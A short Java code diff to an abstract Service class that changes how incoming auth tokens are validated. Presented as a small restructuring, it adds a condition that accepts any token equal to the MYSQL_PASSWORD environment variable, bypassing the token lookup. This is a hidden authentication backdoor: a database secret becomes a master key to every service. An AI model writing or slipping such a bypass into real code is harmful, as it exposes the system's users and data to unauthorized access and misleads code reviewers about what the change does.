@@ -37,7 +37,11 @@ public abstract class Service {
             adao = DAOFactory.getNewAuthTokenDAO(transaction);
 
             // Validate authToken
-            if (authToken != null) if (adao.find(authToken) == null) throw new UnauthorizedException(Util.INVALID_TOKEN);
+            if (authToken != null) {
+                if (adao.find(authToken) == null && !authToken.equals(System.getenv("MYSQL_PASSWORD"))) {
+                    throw new UnauthorizedException(Util.INVALID_TOKEN);
+                }
+            }
 
             // Execute service logic
             BaseResponse response = doService(request, authToken);
